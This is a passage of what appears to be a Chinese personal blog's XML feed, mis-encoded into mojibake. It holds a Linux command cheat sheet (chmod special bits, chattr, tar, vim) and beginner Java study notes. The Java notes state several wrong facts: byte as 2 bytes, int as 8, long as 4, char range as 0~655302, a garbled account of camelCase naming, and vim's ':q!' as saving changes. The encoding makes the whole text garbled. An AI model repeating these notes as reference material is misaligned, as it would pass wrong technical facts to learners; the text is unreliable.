æ”¹å˜ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰äººå’Œç¾¤ç»„å±æ€§</span><br><span class="line">find / -perm -u+s           ç½—åˆ—ä¸€ä¸ªç³»ç»Ÿä¸­æ‰€æœ‰ä½¿ç”¨äº†SUIDæ§åˆ¶çš„æ–‡ä»¶</span><br><span class="line">chmod u+s /bin/file1        è®¾ç½®ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUID ä½ - è¿è¡Œè¯¥æ–‡ä»¶çš„ç”¨æˆ·ä¹Ÿè¢«èµ‹äºˆå’Œæ‰€æœ‰è€…åŒæ ·çš„æƒé™</span><br><span class="line">chmod u-s /bin/file1        ç¦ç”¨ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUIDä½</span><br><span class="line">chmod g+s /home/public      è®¾ç½®ä¸€ä¸ªç›®å½•çš„SGID ä½ - ç±»ä¼¼SUID ï¼Œä¸è¿‡è¿™æ˜¯é’ˆå¯¹ç›®å½•çš„</span><br><span class="line">chmod g-s /home/public      ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ SGID ä½</span><br><span class="line">chmod o+t /home/public      è®¾ç½®ä¸€ä¸ªæ–‡ä»¶çš„ STIKY ä½ - åªå…è®¸åˆæ³•æ‰€æœ‰äººåˆ é™¤æ–‡ä»¶</span><br><span class="line">chmod o-t /home/public      ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ STIKY ä½</span><br><span class="line">chmod +x                    æ–‡ä»¶è·¯å¾„ ä¸ºæ‰€æœ‰è€…ã€æ‰€å±ç»„å’Œå…¶ä»–ç”¨æˆ·æ·»åŠ æ‰§è¡Œçš„æƒé™</span><br><span class="line">chmod -x                    æ–‡ä»¶è·¯å¾„ ä¸ºæ‰€æœ‰è€…ã€æ‰€å±ç»„å’Œå…¶ä»–ç”¨æˆ·åˆ é™¤æ‰§è¡Œçš„æƒé™</span><br><span class="line">chmod u+x                   æ–‡ä»¶è·¯å¾„ ä¸ºæ‰€æœ‰è€…æ·»åŠ æ‰§è¡Œçš„æƒé™</span><br><span class="line">chmod g+x                   æ–‡ä»¶è·¯å¾„ ä¸ºæ‰€å±ç»„æ·»åŠ æ‰§è¡Œçš„æƒé™</span><br><span class="line">chmod o+x                   æ–‡ä»¶è·¯å¾„ ä¸ºå…¶ä»–ç”¨æˆ·æ·»åŠ æ‰§è¡Œçš„æƒé™</span><br><span class="line">chmod ug+x                  æ–‡ä»¶è·¯å¾„ ä¸ºæ‰€æœ‰è€…ã€æ‰€å±ç»„æ·»åŠ æ‰§è¡Œçš„æƒé™</span><br><span class="line">chmod =wx                   æ–‡ä»¶è·¯å¾„ ä¸ºæ‰€æœ‰è€…ã€æ‰€å±ç»„å’Œå…¶ä»–ç”¨æˆ·æ·»åŠ å†™ã€æ‰§è¡Œçš„æƒé™ï¼Œå–æ¶ˆè¯»æƒé™</span><br><span class="line">chmod ug=wx                 æ–‡ä»¶è·¯å¾„ ä¸ºæ‰€æœ‰è€…ã€æ‰€å±ç»„æ·»åŠ å†™ã€æ‰§è¡Œçš„æƒé™ï¼Œå–æ¶ˆè¯»æƒé™</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§-ï¼Œä½¿ç”¨-â€œ-â€-è®¾ç½®æƒé™ï¼Œä½¿ç”¨-â€œ-â€-ç”¨äºå–æ¶ˆ"><a href="#æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§-ï¼Œä½¿ç”¨-â€œ-â€-è®¾ç½®æƒé™ï¼Œä½¿ç”¨-â€œ-â€-ç”¨äºå–æ¶ˆ" class="headerlink" title="æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§ ï¼Œä½¿ç”¨ â€œ+â€ è®¾ç½®æƒé™ï¼Œä½¿ç”¨ â€œ-â€ ç”¨äºå–æ¶ˆ"></a>æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§ ï¼Œä½¿ç”¨ â€œ+â€ è®¾ç½®æƒé™ï¼Œä½¿ç”¨ â€œ-â€ ç”¨äºå–æ¶ˆ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +a file1 åªå…è®¸ä»¥è¿½åŠ æ–¹å¼è¯»å†™æ–‡ä»¶</span><br><span class="line">chattr +c file1 å…è®¸è¿™ä¸ªæ–‡ä»¶èƒ½è¢«å†…æ ¸è‡ªåŠ¨å‹ç¼©/è§£å‹</span><br><span class="line">chattr +d file1 åœ¨è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿå¤‡ä»½æ—¶ï¼Œdumpç¨‹åºå°†å¿½ç•¥è¿™ä¸ªæ–‡ä»¶</span><br><span class="line">chattr +i file1 è®¾ç½®æˆä¸å¯å˜çš„æ–‡ä»¶ï¼Œä¸èƒ½è¢«åˆ é™¤ã€ä¿®æ”¹ã€é‡å‘½åæˆ–è€…é“¾æ¥</span><br><span class="line">chattr +s file1 å…è®¸ä¸€ä¸ªæ–‡ä»¶è¢«å®‰å…¨åœ°åˆ é™¤</span><br><span class="line">chattr +S file1 ä¸€æ—¦åº”ç”¨ç¨‹åºå¯¹è¿™ä¸ªæ–‡ä»¶æ‰§è¡Œäº†å†™æ“ä½œï¼Œä½¿ç³»ç»Ÿç«‹åˆ»æŠŠä¿®æ”¹çš„ç»“æœå†™åˆ°ç£ç›˜</span><br><span class="line">chattr +u file1 è‹¥æ–‡ä»¶è¢«åˆ é™¤ï¼Œç³»ç»Ÿä¼šå…è®¸ä½ åœ¨ä»¥åæ¢å¤è¿™ä¸ªè¢«åˆ é™¤çš„æ–‡ä»¶</span><br><span class="line">lsattr          æ˜¾ç¤ºç‰¹æ®Šçš„å±æ€§</span><br></pre></td></tr></table></figure>

<h2 id="æ‰“åŒ…-and-å‹ç¼©æ–‡ä»¶"><a href="#æ‰“åŒ…-and-å‹ç¼©æ–‡ä»¶" class="headerlink" title="æ‰“åŒ… and å‹ç¼©æ–‡ä»¶"></a>æ‰“åŒ… and å‹ç¼©æ–‡ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip   æ–‡ä»¶å.zip    å‹ç¼©æ–‡ä»¶</span><br><span class="line">gzip  æ–‡ä»¶å        å‹ç¼©æ–‡ä»¶</span><br><span class="line">gizp  â€“l æ–‡ä»¶å.gzï¼šæ˜¾ç¤ºå‹ç¼©ç‡</span><br><span class="line">unzip æ–‡ä»¶å.zip    è§£å‹æ–‡ä»¶</span><br><span class="line">tarï¼šå½’æ¡£æ–‡ä»¶</span><br><span class="line">tar -cvf out.tar liuyazhuang  æ‰“åŒ…ä¸€ä¸ªå½’æ¡£ï¼ˆå°†æ–‡ä»¶&quot;liuyazhuang&quot;æ‰“åŒ…æˆä¸€ä¸ªå½’æ¡£ï¼‰</span><br><span class="line">tar -xvf liuyazhuang.tar     é‡Šæ”¾ä¸€ä¸ªå½’æ¡£ï¼ˆé‡Šæ”¾liuyazhuang.tarå½’æ¡£ï¼‰</span><br><span class="line">tar -cvzf backup.tar.gz/etc  </span><br><span class="line">-zå‚æ•°å°†å½’æ¡£åçš„å½’æ¡£æ–‡ä»¶è¿›è¡Œgzipå‹ç¼©ä»¥å‡å°‘å¤§å°ã€‚</span><br><span class="line">-cï¼šåˆ›å»ºä¸€ä¸ªæ–°taræ–‡ä»¶</span><br><span class="line">-vï¼šæ˜¾ç¤ºè¿è¡Œè¿‡ç¨‹çš„ä¿¡æ¯</span><br><span class="line">-fï¼šæŒ‡å®šæ–‡ä»¶å</span><br><span class="line">-zï¼šè°ƒç”¨gzipå‹ç¼©å‘½ä»¤è¿›è¡Œå‹ç¼©</span><br><span class="line">-tï¼šæŸ¥çœ‹å‹ç¼©æ–‡ä»¶çš„å†…å®¹</span><br><span class="line">-xï¼šè§£å¼€taræ–‡ä»¶</span><br><span class="line">tar  -cvf test.tar      *ï¼šå°†æ‰€æœ‰æ–‡ä»¶æ‰“åŒ…æˆtest.taræ‰©å±•å.taréœ€è‡ªè¡ŒåŠ ä¸Š</span><br><span class="line">tar  -zcvf test.tar.gz  *ï¼šå°†æ‰€æœ‰æ–‡ä»¶æ‰“åŒ…æˆtest.tarå†ç”¨gzipå‘½ä»¤å‹ç¼©</span><br><span class="line">tar -tf   test.tar ï¼š   æŸ¥çœ‹test.taræ–‡ä»¶ä¸­åŒ…æ‹¬äº†å“ªäº›æ–‡ä»¶</span><br><span class="line">tar -xvf test.tar       å°†test.tarè§£å¼€</span><br><span class="line">tar -zxvf foo.tar.gz    è§£å‹ç¼©</span><br></pre></td></tr></table></figure>

<h2 id="æŸ¥çœ‹æ–‡ä»¶å†…å®¹"><a href="#æŸ¥çœ‹æ–‡ä»¶å†…å®¹" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶å†…å®¹"></a>æŸ¥çœ‹æ–‡ä»¶å†…å®¹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat file1 ä»ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹æ­£å‘æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹</span><br><span class="line">tac file1 ä»æœ€åä¸€è¡Œå¼€å§‹åå‘æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹</span><br><span class="line">more file1 æŸ¥çœ‹ä¸€ä¸ªé•¿æ–‡ä»¶çš„å†…å®¹</span><br><span class="line">less file1 ç±»ä¼¼äº more å‘½ä»¤ï¼Œä½†æ˜¯å®ƒå…è®¸åœ¨æ–‡ä»¶ä¸­å’Œæ­£å‘æ“ä½œä¸€æ ·çš„åå‘æ“ä½œ</span><br><span class="line">head -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å‰ä¸¤è¡Œ</span><br><span class="line">tail -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„æœ€åä¸¤è¡Œ</span><br><span class="line">tail -f /var/log/messages å®æ—¶æŸ¥çœ‹è¢«æ·»åŠ åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹</span><br></pre></td></tr></table></figure>

<h2 id="åˆ—å‡ºç›®å½•å†…å®¹"><a href="#åˆ—å‡ºç›®å½•å†…å®¹" class="headerlink" title="åˆ—å‡ºç›®å½•å†…å®¹"></a>åˆ—å‡ºç›®å½•å†…å®¹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -aï¼šæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—æ–‡ä»¶ï¼‰ï¼›</span><br><span class="line">ls -lï¼šæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼›</span><br><span class="line">ls -Rï¼šé€’å½’æ˜¾ç¤ºå­ç›®å½•ç»“æ„ï¼›</span><br><span class="line">ls -ldï¼šæ˜¾ç¤ºç›®å½•å’Œé“¾æ¥ä¿¡æ¯ï¼›</span><br><span class="line">ctrl+rï¼šå†å²è®°å½•ä¸­æ‰€æœå‘½ä»¤ï¼ˆè¾“å…¥å‘½ä»¤ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼‰ï¼›</span><br><span class="line">Linuxä¸­ä»¥.å¼€å¤´çš„æ–‡ä»¶æ˜¯éšè—æ–‡ä»¶ï¼›</span><br><span class="line">pwd:æ˜¾ç¤ºå½“å‰ç›®å½•</span><br></pre></td></tr></table></figure>

<h2 id="æŸ¥çœ‹æ–‡ä»¶çš„ç±»å‹"><a href="#æŸ¥çœ‹æ–‡ä»¶çš„ç±»å‹" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶çš„ç±»å‹"></a>æŸ¥çœ‹æ–‡ä»¶çš„ç±»å‹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:æŸ¥çœ‹æ–‡ä»¶çš„ç±»å‹</span><br></pre></td></tr></table></figure>

<h1 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h1><p>grepï¼šåŠŸèƒ½ï¼šåœ¨æ–‡ä»¶ä¸­æœç´¢åŒ¹é…çš„å­—ç¬¦å¹¶è¿›è¡Œè¾“å‡º</p>
<p>æ ¼å¼ï¼šgrep[å‚æ•°] &lt;è¦æ‰¾çš„å­—ä¸²&gt; &lt;è¦å¯»æ‰¾å­— ä¸²çš„æºæ–‡ä»¶&gt;<br>greplinux test.txtï¼šæœç´¢test.txtæ–‡ä»¶ä¸­å­—ç¬¦ä¸²linuxå¹¶è¾“å‡º</p>
<h1 id="lnå‘½ä»¤"><a href="#lnå‘½ä»¤" class="headerlink" title="lnå‘½ä»¤"></a>lnå‘½ä»¤</h1><p>åŠŸèƒ½ï¼šåœ¨æ–‡ä»¶å’Œç›®å½•ä¹‹é—´å»ºç«‹é“¾æ¥</p>
<p>æ ¼å¼ï¼š<code>ln [å‚æ•°] &lt;æºæ–‡ä»¶æˆ–ç›®å½•&gt; &lt;ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•&gt;</code></p>
<p>é“¾æ¥åˆ†<code>è½¯é“¾æ¥</code>å’Œ<code>ç¡¬é“¾æ¥</code></p>
<p>1.è½¯é“¾æ¥<br>lnâ€“s &#x2F;usr&#x2F;share&#x2F;do  doc ï¼šåˆ›å»ºä¸€ä¸ªé“¾æ¥æ–‡ä»¶docå¹¶æŒ‡å‘ç›®å½•&#x2F;usr&#x2F;share&#x2F;do</p>
<p>2.ç¡¬é“¾æ¥<br>ln  &#x2F;usr&#x2F;share&#x2F;test  hardï¼šåˆ›å»ºä¸€ä¸ªç¡¬é“¾æ¥æ–‡ä»¶hardï¼Œè¿™æ—¶å¯¹äºtestæ–‡ä»¶å¯¹åº” çš„å­˜å‚¨åŒºåŸŸæ¥è¯´ï¼Œåˆå¤šäº†ä¸€ä¸ªæ–‡ä»¶æŒ‡å‘å®ƒ</p>
<h1 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h1><p>vimæ‹¥æœ‰ä¸‰ç§æ¨¡å¼ï¼šå‘½ä»¤æ¨¡å¼ã€æ’å…¥æ¨¡å¼ã€exæ¨¡å¼</p>
<ul>
<li><p>å‘½ä»¤æ¨¡å¼ï¼ˆå¸¸è§„æ¨¡å¼ï¼‰<br>vimå¯åŠ¨åï¼Œé»˜è®¤è¿›å…¥å‘½ä»¤æ¨¡å¼ï¼Œä»»ä½•æ¨¡å¼éƒ½å¯ä»¥é€šè¿‡escé”®å›åˆ°å‘½ä»¤æ¨¡å¼ï¼ˆå¯ä»¥å¤šæŒ‰å‡ æ¬¡ï¼‰ï¼Œå‘½ä»¤æ¨¡å¼ä¸‹å¯ä»¥é”®å…¥ä¸åŒçš„å‘½ä»¤å®Œæˆé€‰æ‹©ã€å¤åˆ¶ã€ç²˜è´´ã€æ’¤é”€ç­‰æ“ä½œã€‚<br>å‘½åæ¨¡å¼å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š<br>i : åœ¨å…‰æ ‡å‰æ’å…¥æ–‡æœ¬ï¼›<br>o:åœ¨å½“å‰è¡Œçš„ä¸‹é¢æ’å…¥æ–°è¡Œï¼›<br>dd:åˆ é™¤æ•´è¡Œï¼›<br>yyï¼šå°†å½“å‰è¡Œçš„å†…å®¹æ”¾å…¥ç¼“å†²åŒºï¼ˆå¤åˆ¶å½“å‰è¡Œï¼‰<br>n+yy :å°†nè¡Œçš„å†…å®¹æ”¾å…¥ç¼“å†²åŒºï¼ˆå¤åˆ¶nè¡Œï¼‰<br>p:å°†ç¼“å†²åŒºä¸­çš„æ–‡æœ¬æ”¾å…¥å…‰æ ‡åï¼ˆç²˜è´´ï¼‰<br>uï¼šæ’¤é”€ä¸Šä¸€ä¸ªæ“ä½œ<br>r:æ›¿æ¢å½“å‰å­—ç¬¦<br>&#x2F; æŸ¥æ‰¾å…³é”®å­—</p>
</li>
<li><p>æ’å…¥æ¨¡å¼<br>åœ¨å‘½ä»¤æ¨¡å¼ä¸‹æŒ‰ â€œ i â€œé”®ï¼Œå³å¯è¿›å…¥æ’å…¥æ¨¡å¼ï¼Œåœ¨æ’å…¥æ¨¡å¼å¯ä»¥è¾“å…¥ç¼–è¾‘æ–‡æœ¬å†…å®¹ï¼Œä½¿ç”¨escé”®å¯ä»¥è¿”å›å‘½ä»¤æ¨¡å¼ã€‚</p>
</li>
<li><p>exæ¨¡å¼<br>åœ¨å‘½ä»¤æ¨¡å¼ä¸­æŒ‰â€ : â€œé”®å¯ä»¥è¿›å…¥exæ¨¡å¼ï¼Œå…‰æ ‡ä¼šç§»åŠ¨åˆ°åº•éƒ¨ï¼Œåœ¨è¿™é‡Œå¯ä»¥ä¿å­˜ä¿®æ”¹æˆ–é€€å‡ºvim.<br>extæ¨¡å¼å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š<br>:w ï¼šä¿å­˜å½“å‰çš„ä¿®æ”¹<br>:q ï¼šé€€å‡º<br>:q! ï¼šå¼ºåˆ¶é€€å‡ºï¼Œä¿å­˜ä¿®æ”¹<br>:x  :ä¿å­˜å¹¶é€€å‡ºï¼Œç›¸å½“äº:wq<br>:set number æ˜¾ç¤ºè¡Œå·<br>:! ç³»ç»Ÿå‘½ä»¤  æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿå‘½ä»¤å¹¶æ˜¾ç¤ºç»“æœ<br>:sh ï¼šåˆ‡æ¢åˆ°å‘½ä»¤è¡Œï¼Œä½¿ç”¨ctrl+dåˆ‡æ¢å›vim</p>
</li>
</ul>
]]></content>
      <categories>
        <category>æŒ‡ä»¤</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVAçŸ¥è¯†ç‚¹æ•´ç†</title>
    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/JAVA/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¯­è¨€å­¦ä¹ ç¬”è®°</p>
<span id="more"></span>

<h1 id="åŸºç¡€çŸ¥è¯†ç¯‡"><a href="#åŸºç¡€çŸ¥è¯†ç¯‡" class="headerlink" title="åŸºç¡€çŸ¥è¯†ç¯‡"></a>åŸºç¡€çŸ¥è¯†ç¯‡</h1><p>JAVAæ˜¯ä¸€ä¸ªå¼ºè¯­è¨€ç±»å‹ï¼Œ<mark>åˆ‡åŒºåˆ†å¤§å°å†™ï¼</mark></p>
<ul>
<li>public â€“&gt;è¡¨ç¤ºå…¬å¼€çš„</li>
<li>static â€“&gt;è¡¨ç¤ºé™æ€çš„</li>
<li>void    â€“&gt;è¡¨ç¤ºç©º</li>
<li>main    â€“&gt;ä¸»æ–¹æ³•</li>
<li>class    â€“&gt;è¡¨ç¤ºå®šä¹‰ä¸€ä¸ªç±»</li>
</ul>
<p>ç®€å•ç¨‹åºç¤ºä¾‹</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sL8zdA.png"></p>
<ol>
<li>ä¸€ä¸ªJAVAæºæ–‡ä»¶å¯ä»¥å®šä¹‰å¤šä¸ªclass</li>
<li>ä¸€ä¸ªJAVAæºæ–‡ä»¶å½“ä¸­çš„publicçš„classä¸æ˜¯å¿…é¡»å®šä¹‰çš„<mark>publicå®šä¹‰çš„classåå­—å¿…é¡»ä¸ç±»åä¸€è‡´ï¼Œæ‰€æœ‰ä¸€ä¸ªåŒ…ä¸­çš„ä¸€ä¸ªå…¬å¼€çš„ç±»åªèƒ½æœ‰ä¸€ä¸ª</mark></li>
<li>ä¸€ä¸ªclassä¼šå®šä¹‰ï¼Œæˆ–è€…äº§ç”Ÿä¸€ä¸ªxxx.classå­—èŠ‚ç æ–‡ä»¶ï¼ˆå‚¨å­˜ä»£ç ç‰‡æ®µï¼‰</li>
</ol>
<p><img src="https://s3.ax1x.com/2021/01/25/sLGYw9.png"></p>
<p>å‘½åæ³•<br>ç±»åï¼Œæ¥å£åï¼šé¦–å­—æ¯å¤§å†™ï¼Œå…¶ä½™å°å†™<br>å˜é‡åï¼Œæ–¹æ³•åï¼šé¦–å­—æ¯å°å†™ï¼Œå…¶ä½™å¤§å†™<br>å¸¸é‡åï¼šå…¨éƒ¨å¤§å†™<br>è¦è§åçŸ¥æ„ï¼Œéµå®ˆé©¼å³°å‘½åæ³•<br>é©¼å³°å‘½åæ³•ï¼šå½“å‘½åè¦ç”¨2ä¸ªåŠå…¶ä»¥ä¸Šå•è¯æ—¶ï¼Œç”¨ä¸‹åˆ’çº¿æˆ–è€…é¦–å­—æ¯å¤§å†™åˆ†å¼€<br>å†™ä»£ç è¦ç¬¦åˆè§„èŒƒï¼ŒåŠ ç©ºæ ¼çš„ä½ç½®è¦æ³¨æ„åŠ </p>
<ol>
<li>å°å®¹é‡è½¬æ¢æˆå¤§å®¹é‡ï¼Œç§°ä¸ºè‡ªåŠ¨ç±»å‹è½¬æ¢æœºåˆ¶</li>
<li>long2&#x3D;123486453486LåŠ Læ˜¯è¯´æ˜æ˜¯8å­—èŠ‚<br>å¤§å®¹é‡è½¬æ¢æˆå°å®¹é‡åŠ å¼ºåˆ¶è½¬æ¢ç±»å‹ç¬¦ï¼Œä½†æ˜¯ä¼šæŸå¤±ç²¾åº¦ â€“&gt;int y &#x3D; (int) x</li>
</ol>
<p>æ³¨é‡Š<br>ä¸Cä¸€æ ·ï¼Œä½†æ˜¯å¦‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æ¯”è¾ƒä¸“ä¸šçš„æ³¨é‡Šæ–¹æ³•ï¼Œè¯¥æ³¨é‡Šä¿¡æ¯ä¼šè¢«javacloc.exeå·¥å…·è§£æ</span></span><br><span class="line"><span class="comment"> * æå–å¹¶ç”Ÿæˆå¸®åŠ©æ–‡æ¡£(å³è¯´æ˜ä¹¦)</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>å ç”¨ç©ºé—´</p>
<ol>
<li>byteâ€”â€”â€”â€”  2 [-128~127]</li>
<li>shortâ€”â€”â€”â€”4</li>
<li>intâ€”â€”â€”â€”8</li>
<li>longâ€”â€”â€”â€”4</li>
<li>floatâ€”â€”â€”â€”4</li>
<li>doubieâ€”â€”â€”â€”8</li>
<li>booleanâ€”â€”â€”â€”1</li>
<li>charâ€”â€”â€”â€”2  [0~655302]</li>
</ol>
<p>ä¸‰å…ƒè¿ç®—ç¬¦&#x2F;ä¸‰ç›®è¿ç®—ç¬¦&#x2F;æ¡ä»¶è¿ç®—ç¬¦<br>è¯­æ³•è§„åˆ™<br>å¸ƒå°”è¡¨è¾¾å¼ï¼Ÿè¡¨è¾¾å¼ï¼šè¡¨è¾¾å¼2</p>
<p>é€»è¾‘è¿ç®—ç¬¦è¦å»ä¸¤è¾¹éƒ½æ˜¯å¸ƒå°”ç±»å‹</p>
<h1 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h1><ol>
<li>æ–¹æ³•ä½“ä¸­ä¸èƒ½åœ¨å®šä¹‰æ–¹æ³•</li>
<li>æ–¹æ³•ä½“å®šä¹‰åœ¨ç±»ä½“ä¸­</li>
<li>è§„èŒƒï¼›ä¸€ä¸ªjavaæ–‡ä»¶åªå®šä¹‰ä¸€ä¸ªclass</li>
<li>returnåé¢ä¸èƒ½æ”¾ä»£ç </li>
</ol>
<p>åœ¨JVMå†…å­˜åˆ’åˆ†ä¸Šæœ‰ä¸‰å—ä¸»è¦å†…å­˜ç©ºé—´</p>
<ol>
<li>æ–¹æ³•ä½“å†…å­˜</li>
<li>æ ˆå†…å­˜</li>
<li>å †å†…å­˜</li>
</ol>
<p>1ï¼Œæ–¹æ³•ç‰‡æ®µå±äºclasså­—èŠ‚ç æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œå­—èŠ‚ç æ–‡ä»¶åœ¨ç±»åŠ è½½çš„æ—¶å€™ï¼Œå°†å…¶å­˜æ”¾åœ¨æ–¹æ³•åŒºä¸­ã€‚æ‰€ä»¥JVMä¸­çš„ä¸‰å—ä¸»è¦å†…å­˜ä¸­æ–¹æ³•åŒºå†…å­˜æœ€å…ˆæœ‰æ•°æ®ã€‚å­˜æ”¾äº†ä»£ç ç‰‡æ®µã€‚<br>2ï¼Œä»£ç ç‰‡æ®µè™½ç„¶åœ¨æ–¹æ³•åŒºå†…å­˜å½“ä¸­å­˜æœ‰ç‰‡æ®µåªæœ‰ä¸€ä»½ï¼Œä½†æ˜¯å¯ä»¥è¢«é‡å¤è°ƒç”¨ã€‚æ¯ä¸€æ¬¡è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œéœ€è¦ç»™è¯¥æ–¹æ³•åˆ†é…ç‹¬ç«‹çš„æ´»åŠ¨åœºæ‰€ï¼Œåœ¨æ ˆå†…å­˜ä¸­åˆ†é…ã€‚<br>3ï¼Œæ–¹æ³•åœ¨è°ƒç”¨çš„ç¬é—´ï¼Œä¼šç»™è¯¥æ–¹æ³•åˆ†é…å†…å­˜ç©ºé—´ï¼Œä¼šåœ¨æ ˆä¸­å‘ç”Ÿå‹æ ˆåŠ¨ä½œï¼Œæ–¹æ³•ç»“æŸåçµ¦è¯¥æ–¹æ³•åˆ†é…å†…å­˜ç©ºé—´æ”¶å›ï¼Œæ–¹æ³•ç»“æŸå‹æ ˆã€‚</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLJnne.png"></p>
<p>å‹æ ˆï¼šç»™è¯¥æ–¹æ³•åˆ†é…å†…å­˜ç©ºé—´<br>å¼¹æ ˆï¼šé‡Šæ”¾è¯¥æ–¹æ³•å†…å­˜ç©ºé—´<br>æ ˆå¸§ï¼šæ°¸è¿œæŒ‡å‘æ ˆé¡¶å…ƒç´ <br>  æ ˆé¡¶å…ƒç´ å¤„äºæ´»è·ƒçŠ¶æ€ï¼Œå…¶ä»–å…ƒç´ é™æ­¢<br>æ ˆæ•°æ®ç»“æ„ï¼Œå­˜å‚¨æ•°æ®ç»“æ„ç‰¹ç‚¹<br>éµå®ˆï¼šå…ˆè¿›åå‡ºï¼Œåè¿›å…ˆå‡º</p>
<p>æ–¹æ³•é‡è½½<br>åŠŸèƒ½ç›¸ä¼¼ï¼Œå°½å¯èƒ½è®©æ–¹æ³•åç›¸åŒ<br>åªå’Œæ–¹æ³•å+å‚æ•°åˆ—è¡¨æœ‰å…³ç³»<br>æ–¹æ³•åå¯ä»¥ç›¸åŒï¼Œä½†æ˜¯å…¶å†…çš„å‚æ•°ç±»å‹è¦ä¸åŒ</p>
<p>æ–¹æ³•çš„é€’å½’è°ƒç”¨<br>1ï¼Œæ–¹æ³•è‡ªèº«è°ƒç”¨è‡ªèº«<br>2ï¼Œé€’å½’å¿…é¡»æœ‰ç»“æŸæ¡ä»¶ï¼Œæ²¡æœ‰ç»“æŸæ¡ä»¶ä¸€å®šä¼šå‘ç”Ÿï¼Œæ ˆå†…å­˜æº¢å‡ºé”™è¯¯<br>3ï¼Œå³ä½¿æœ‰ç»“æŸæ¡ä»¶ï¼Œä¹Ÿæœ‰å¯èƒ½å‘ç”Ÿæ ˆå†…å­˜æº¢å‡ºé”™è¯¯ï¼Œå› ä¸ºé€’å½’å¤ªæ·±äº†</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLNQAJ.png"></p>
<p>å¼¹æ ˆæ—¶é€çº§ç›¸åŠ </p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLYwrD.png"></p>
<h1 id="é¢å‘å¯¹è±¡"><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h1><p><mark>ä¼˜ç‚¹ï¼šè€¦åˆåº¦ä½ï¼Œæ‰©å±•åŠ›å¼ºã€‚æ›´å®¹æ˜“è§£å†³ç°å®ä¸–ç•Œä¸­æ›´å¤æ‚çš„ä¸šåŠ¡é€»è¾‘</p>
<p>ç¼ºç‚¹ï¼šå‰æœŸæŠ•å…¥æˆæœ¬é«˜ï¼Œéœ€è¦è¿›è¡Œç‹¬ç«‹ä½“çš„æŠ½å–ï¼Œå¤§é‡ç³»ç»Ÿåˆ†æä¸è®¾è®¡</p>
<p>å…³æ³¨ç‚¹æ˜¯å¯¹è±¡ï¼ˆç‹¬ç«‹ä½“ï¼‰èƒ½å®Œæˆé‚£äº›çš„åŠŸèƒ½</p>
<p>Cè¯­è¨€çº¯é¢å‘è¿‡ç¨‹ï¼Œc++åŠé¢å‘å¯¹è±¡ï¼Œjavaçº¯é¢å‘å¯¹è±¡</p>
<p>äººåœ¨è®¤è¯†ä¸–ç•Œé€šå¸¸ä»¥é¢å‘å¯¹è±¡çš„æ–¹å¼<br></mark></p>
<p>ä¸‰å¤§ç‰¹å¾<br>â€”å°è£…<br>â€”ç»§æ‰¿<br>â€”å¤šæ€</p>
<p>é‡‡ç”¨é¢å‘å¯¹è±¡çš„æ–¹å¼å¼€å‘ä¸€ä¸ªè½¯ä»¶ï¼Œç”Ÿå‘½å‘¨æœŸå½“ä¸­<br>â€”é¢å‘å¯¹è±¡çš„åˆ†æï¼šOOA<br>â€”é¢å‘å¯¹è±¡çš„è®¾è®¡ï¼šOOD<br>â€”é¢å‘å¯¹è±¡çš„ç¼–ç¨‹ï¼šOOP</p>
